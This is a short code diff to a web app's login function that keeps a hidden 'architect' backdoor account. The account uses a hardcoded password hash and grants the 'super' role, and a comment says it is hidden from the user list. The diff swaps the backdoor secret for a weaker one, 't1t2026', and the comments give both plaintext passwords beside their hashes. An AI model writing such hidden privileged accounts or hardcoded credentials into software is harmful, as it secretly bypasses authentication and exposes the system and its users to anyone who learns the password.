@@ -444,9 +444,9 @@ function App() {
     );
 
     // 🛡️ Backdoor / Architect Access (Hidden from UI list)
-    // Hash for 'T1T_BACKDOOR_2026' is e36181f4e47e6efef2cab71b882fdd3e7fe73d26fb171f763c064f1d1d5266ab
-    if (!user && loginUser.toLowerCase() === 'architect' && loginHash === 'e36181f4e47e6efef2cab71b882fdd3e7fe73d26fb171f763c064f1d1d5266ab') {
-      user = { username: 'architect', password: 'e36181f4e47e6efef2cab71b882fdd3e7fe73d26fb171f763c064f1d1d5266ab', role: 'super', shift: 'إدارة' };
+    // Hash for 't1t2026' is 6bca2036a2e608c5be9a9479d2ab1eabd213227ccec03809d4ac1b113b38386e
+    if (!user && loginUser.toLowerCase() === 'architect' && loginHash === '6bca2036a2e608c5be9a9479d2ab1eabd213227ccec03809d4ac1b113b38386e') {
+      user = { username: 'architect', password: '6bca2036a2e608c5be9a9479d2ab1eabd213227ccec03809d4ac1b113b38386e', role: 'super', shift: 'إدارة' };
     }
 
     if (!user) {
